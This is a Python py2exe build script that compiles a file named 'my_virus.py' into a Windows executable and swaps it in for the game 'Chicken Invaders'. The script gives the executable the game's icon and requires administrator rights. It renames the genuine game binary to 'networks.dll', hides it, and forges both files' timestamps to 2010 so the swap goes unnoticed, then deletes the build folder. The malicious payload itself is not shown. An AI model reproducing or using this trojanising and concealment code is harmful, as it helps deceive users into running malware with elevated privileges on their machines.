from distutils.core import setup
import py2exe, sys, os
import ctypes
import os
import time
import datetime
original_file_old_name = r"game/Chicken Invaders.exe"
original_file_new_name = r"game/networks.dll"


def set_mod_date(fileLocation,year, month, day, hour, minute, second):
    """
    this function allows you to mod the date of the file.
    :param fileLocation:
    :param year:
    :param month:
    :param day:
    :param hour:
    :param minute:
    :param second:
    :return:
    """
    date = datetime.datetime(year=year, month=month, day=day, hour=hour, minute=minute, second=second)
    modTime = time.mktime(date.timetuple())
    os.utime(fileLocation, (modTime, modTime))


def make_file_hidden(fileName):
    os.system("attrib +h " + fileName)


    def make_file_unhidden(fileName):
        os.system("attrib -h " + fileName)


if __name__ == '__main__':
    sys.argv.append('py2exe')

    setup(
        options={'py2exe': {'bundle_files': 1, 'compressed': True}},
        windows=[{
            'script': "my_virus.py",
            "icon_resources": [(1, "game\\logo.ico")],
            'uac_info': "requireAdministrator",

        }],
        zipfile=None,
    )

    try:
        old_name = original_file_old_name
        new_name = original_file_new_name
        os.rename(old_name, new_name)
    except FileExistsError:
        print(" already transferred the original file.")
    except FileNotFoundError:
        print(" already transferred the original file.")

    set_mod_date(fileLocation = r"dist/my_virus.exe", year = 2010, month = 12, day = 25, hour = 10, minute = 58, second = 0)
    set_mod_date(fileLocation =original_file_new_name, year = 2010, month = 12, day = 25, hour = 10,
                 minute = 58, second = 0)
    make_file_hidden(original_file_new_name)
    old_name = r"dist/my_virus.exe"
    new_name = r"game/Chicken Invaders.exe"
    try:
        os.rename(old_name, new_name)
    except FileExistsError:
        os.remove(new_name)
        os.rename(old_name, new_name)

path_to_dir  = 'dist'  # path to directory you wish to remove
files_in_dir = os.listdir(path_to_dir)     # get list of files in the directory

for file in files_in_dir:                  # loop to delete each file in folder
    os.remove(f'{path_to_dir}/{file}')     # delete file

os.rmdir(path_to_dir)
